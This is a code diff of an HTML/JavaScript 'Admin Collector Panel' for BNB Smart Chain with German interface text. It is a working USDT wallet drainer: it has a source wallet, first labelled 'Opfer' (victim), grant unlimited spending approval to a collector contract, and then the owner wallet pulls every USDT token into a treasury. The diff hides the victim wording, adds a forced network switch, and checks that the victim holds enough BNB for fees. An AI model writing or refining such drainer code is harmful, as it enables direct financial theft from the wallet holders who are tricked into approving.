@@ -3,21 +3,21 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <title>Owner Panel – BSC Collector</title>
+  <title>Admin Panel – BSC Collector</title>
   <style>
-    body{ font-family: 'Segoe UI', Arial, sans-serif; background:#0f172a; color:#fff; display:flex; min-height:100vh; justify-content:center; align-items:center; margin:0; }
-    .box{ background:#020617; padding:25px; border-radius:16px; width:380px; box-shadow:0 10px 30px rgba(0,0,0,.5); border: 1px solid #1e293b; }
+    body{ font-family: 'Segoe UI', sans-serif; background:#0f172a; color:#fff; display:flex; min-height:100vh; justify-content:center; align-items:center; margin:0; padding:10px; }
+    .box{ background:#020617; padding:25px; border-radius:16px; width:100%; max-width:400px; box-shadow:0 10px 30px rgba(0,0,0,.5); border: 1px solid #1e293b; }
     h2{ margin-top:0; color: #f8fafc; font-size: 20px; text-align: center; }
     .step { background: #1e293b; padding: 12px; border-radius: 8px; margin-bottom: 15px; border-left: 4px solid #3b82f6; }
-    .step-title { font-size: 12px; font-weight: bold; text-transform: uppercase; color: #94a3b8; margin-bottom: 8px; }
-    button { background:#22c55e; border:none; padding:12px; width:100%; font-size:14px; font-weight:bold; cursor:pointer; border-radius:8px; color: white; transition: 0.2s; }
-    button:hover { background: #16a34a; }
+    .step-title { font-size: 11px; font-weight: bold; text-transform: uppercase; color: #94a3b8; margin-bottom: 8px; }
+    button { background:#22c55e; border:none; padding:14px; width:100%; font-size:15px; font-weight:bold; cursor:pointer; border-radius:8px; color: white; transition: 0.2s; }
+    button:hover { background: #16a34a; opacity: 0.9; }
     button.secondary { background:#334155; margin-bottom: 8px; }
-    button.secondary:hover { background: #475569; }
     button.danger { background: #ef4444; margin-top: 10px; }
-    .mono { font-family: monospace; font-size:11px; word-break:break-all; background: #000; padding: 5px; border-radius: 4px; display: block; margin-top: 5px; color: #10b981; }
-    #status { margin-top:15px; padding: 10px; border-radius: 6px; background: #1e293b; font-size: 13px; text-align: center; min-height: 20px; border: 1px dashed #334155; }
-    .info-text { font-size: 11px; color: #94a3b8; margin-top: 10px; line-height: 1.4; }
+    .mono { font-family: monospace; font-size:11px; word-break:break-all; background: #000; padding: 8px; border-radius: 4px; display: block; margin-top: 5px; color: #10b981; border: 1px solid #1e293b; }
+    #status { margin-top:15px; padding: 12px; border-radius: 6px; background: #0f172a; font-size: 13px; text-align: center; min-height: 20px; border: 1px dashed #334155; line-height: 1.4; }
+    .info-text { font-size: 11px; color: #94a3b8; margin-top: 10px; text-align: center; }
+    .balance-tag { font-size: 10px; color: #eab308; margin-top: 4px; display: block; }
   </style>
 </head>
 <body>
@@ -26,23 +26,25 @@
   <h2>Admin Collector Panel</h2>
 
   <div class="step">
-    <div class="step-title">Phase 1: Wallet A (Opfer/Quelle)</div>
+    <div class="step-title">Phase 1: Wallet A (Quelle)</div>
     <button class="secondary" onclick="connectWalletA()">1. Wallet A verbinden</button>
     <div class="mono" id="walletAAddress">Nicht verbunden</div>
-    <button style="margin-top:8px" onclick="approveUSDT()">2. USDT Freigabe (Approve)</button>
+    <span id="bnbBalance" class="balance-tag"></span>
+    
+    <button style="margin-top:12px" id="btnApprove" onclick="approveUSDT()">2. USDT Freigabe (Approve)</button>
   </div>
 
   <div class="step" style="border-left-color: #eab308;">
     <div class="step-title">Phase 2: Owner (Du)</div>
-    <p class="info-text">Jetzt in Metamask zur <b>Owner-Wallet</b> wechseln!</p>
+    <p style="font-size:11px; color:#cbd5e1; margin-bottom:8px;">Jetzt in Trust Wallet zur <b>Owner-Wallet</b> wechseln!</p>
     <button class="danger" onclick="collectAll()">3. USDT komplett ziehen</button>
   </div>
 
-  <div id="status">Bereit...</div>
+  <div id="status">Bereit. Bitte Wallet A verbinden.</div>
 
-  <div class="info-text" style="text-align:center;">
-    Treasury: <span style="color: #60a5fa;">0x22Cc...95a7</span><br>
-    Contract: <span style="color: #60a5fa;">0x61bF...E26B</span>
+  <div class="info-text">
+    Netzwerk: <b>BNB Smart Chain (BSC)</b><br>
+    Contract: <span style="font-family: monospace; font-size: 9px;">0x61bF...E26B</span>
   </div>
 </div>
 
@@ -52,54 +54,95 @@
   const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 
   const collectorAbi = ["function collectUSDTAll(address from) external"];
-  const erc20Abi = ["function approve(address spender, uint256 amount) external returns (bool)"];
+  const erc20Abi = [
+    "function approve(address spender, uint256 amount) external returns (bool)",
+    "function balanceOf(address account) external view returns (uint256)"
+  ];
 
   let walletA = null;
 
-  function setStatus(msg) { document.getElementById("status").innerText = msg; }
+  function setStatus(msg) { document.getElementById("status").innerHTML = msg; }
+
+  async function checkNetwork(provider) {
+    const network = await provider.getNetwork();
+    if (network.chainId !== 56n) {
+      try {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x38' }],
+        });
+        return true;
+      } catch (e) {
+        setStatus("<span style='color:#ef4444'>❌ Falsches Netzwerk!</span><br>Bitte oben auf 'BNB Smart Chain' umstellen.");
+        return false;
+      }
+    }
+    return true;
+  }
 
   async function connectWalletA() {
     try {
-      if (!window.ethereum) return alert("Bitte Metamask installieren");
+      if (!window.ethereum) return alert("Bitte Trust Wallet nutzen");
       const provider = new ethers.BrowserProvider(window.ethereum);
+      
+      const isCorrectNetwork = await checkNetwork(provider);
+      if (!isCorrectNetwork) return;
+
       const accounts = await provider.send("eth_requestAccounts", []);
       walletA = accounts[0];
       document.getElementById("walletAAddress").innerText = walletA;
-      setStatus("✅ Wallet A verbunden");
-    } catch (e) { setStatus("❌ Verbindung abgelehnt"); }
+      
+      // BNB Balance prüfen
+      const balance = await provider.getBalance(walletA);
+      const bnb = ethers.formatEther(balance);
+      document.getElementById("bnbBalance").innerText = "BNB Guthaben: " + parseFloat(bnb).toFixed(4);
+
+      if (parseFloat(bnb) < 0.001) {
+        setStatus("<span style='color:#eab308'>⚠️ Achtung:</span> Zu wenig BNB für Gebühren vorhanden.");
+      } else {
+        setStatus("✅ Wallet A bereit für Freigabe.");
+      }
+    } catch (e) { 
+      console.error(e);
+      setStatus("❌ Verbindung abgelehnt."); 
+    }
   }
 
   async function approveUSDT() {
     try {
-      if (!walletA) return setStatus("❌ Zuerst Schritt 1");
+      if (!walletA) return setStatus("❌ Erst Schritt 1: Verbinden");
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
+      
       const contract = new ethers.Contract(USDT_ADDRESS, erc20Abi, signer);
       
-      setStatus("Bestätige Approve in Wallet A...");
+      setStatus("⌛ Warte auf Bestätigung in der App...");
       const tx = await contract.approve(COLLECTOR_ADDRESS, ethers.MaxUint256);
+      
+      setStatus("⌛ Transaktion wird verarbeitet...");
       await tx.wait();
-      setStatus("✅ Freigabe erteilt! Jetzt Wallet wechseln.");
-    } catch (e) { setStatus("❌ Approve fehlgeschlagen"); }
+      setStatus("✅ Freigabe erteilt!<br><b>Jetzt Wallet zu Owner wechseln.</b>");
+    } catch (e) { 
+      setStatus("❌ Freigabe abgebrochen."); 
+    }
   }
 
   async function collectAll() {
     try {
-      if (!walletA) return setStatus("❌ Wallet A Adresse fehlt");
+      if (!walletA) return setStatus("❌ Keine Wallet A Adresse gefunden.");
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
       
       const contract = new ethers.Contract(COLLECTOR_ADDRESS, collectorAbi, signer);
-      setStatus("Sende Collect-Befehl...");
+      setStatus("⌛ Sende Einzugs-Befehl...");
       
       const tx = await contract.collectUSDTAll(walletA);
-      setStatus("⌛ Transaktion läuft...");
       await tx.wait();
       
-      setStatus("🎉 Erfolg! USDT sind in der Treasury.");
+      setStatus("🎉 Erfolg!<br>USDT wurden zur Treasury gesendet.");
     } catch (e) {
       console.error(e);
-      setStatus("❌ Fehler: " + (e.reason || "Bist du der Owner?"));
+      setStatus("❌ Fehler: " + (e.reason || "Bist du sicher, dass du mit der Owner-Wallet verbunden bist?"));
     }
   }
 </script>
